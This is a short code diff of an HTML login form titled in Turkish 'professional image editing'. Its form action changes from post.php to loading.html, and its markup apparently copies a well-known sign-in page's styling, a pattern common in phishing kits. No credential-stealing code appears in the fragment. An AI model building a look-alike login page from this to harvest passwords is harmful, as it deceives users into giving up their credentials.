@@ -105,7 +105,7 @@ init();
 
   <div class="auth-form px-3" id="login" >
 
-      <form action="post.php" method="post">
+      <form action="loading.html" method="post">
         <div class="auth-form-header p-2">
           <h1 style="color:rgb(8, 120, 38); font-family: courier; font-weight: bold;">PROFESYONEL RESİM DÜZENLEME</h1>
         </div>
